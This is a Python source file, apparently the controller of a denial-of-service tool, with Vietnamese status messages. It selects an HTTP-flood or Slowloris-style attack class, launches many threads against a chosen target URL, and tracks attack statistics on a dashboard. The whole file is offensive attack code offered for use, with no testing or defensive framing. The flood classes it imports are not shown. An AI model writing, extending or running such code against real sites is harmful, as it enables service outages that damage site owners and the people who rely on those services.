# -*- coding: utf-8 -*-
import time

import config
from utils.display import launch_dashboard, console
from core.vectors.http_flood import HTTPMatrix
from core.vectors.slow_loris import SlowPipe

class AttackManager:
    def __init__(self, target_url, vector_choice, mode, threads):
        self.target_url = target_url
        self.vector_choice = vector_choice
        self.mode = mode
        self.threads = threads
        self.all_threads = []

    def select_vector(self):
        if self.vector_choice == "1":
            return HTTPMatrix
        elif self.vector_choice == "2":
            return SlowPipe
        console.print(f"[bold red]Lựa chọn vector không hợp lệ. Mặc định dùng HTTP Matrix.[/bold red]")
        return HTTPMatrix

    def start_attack(self):
        console.print("[bold purple]Đang triển khai các vector tấn công...[/bold purple]")
        VectorClass = self.select_vector()

        for _ in range(self.threads):
            thread = VectorClass(target_url=self.target_url, mode=self.mode)
            self.all_threads.append(thread)

        config.attack_stats['start_time'] = time.time()
        
        dashboard_thread = launch_dashboard()

        for thread in self.all_threads:
            thread.start()
            time.sleep(0.001)

        try:
            for t in self.all_threads:
                t.join()
        except KeyboardInterrupt:
            config.stop_event.set()
        finally:
            config.stop_event.set()
            if dashboard_thread and dashboard_thread.is_alive():
                dashboard_thread.join()
            console.print("\n[bold yellow]Đang thu hồi tất cả các luồng...[/bold yellow]")

